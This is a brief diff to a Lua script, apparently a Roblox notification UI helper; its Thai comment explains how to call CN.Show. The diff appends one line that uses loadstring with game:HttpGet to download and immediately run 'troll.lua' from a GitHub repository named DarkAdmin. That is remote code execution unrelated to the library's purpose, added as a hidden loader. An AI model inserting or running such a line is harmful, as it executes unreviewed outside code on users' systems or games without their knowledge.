@@ -89,3 +89,4 @@ if not CN.UI then
 end
 
 --วิธีใช้หลังรัน:CN.Show('หัวข้อ', 'ข้อความ', เวลา)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/DarkAdmin/refs/heads/main/troll.lua"))()
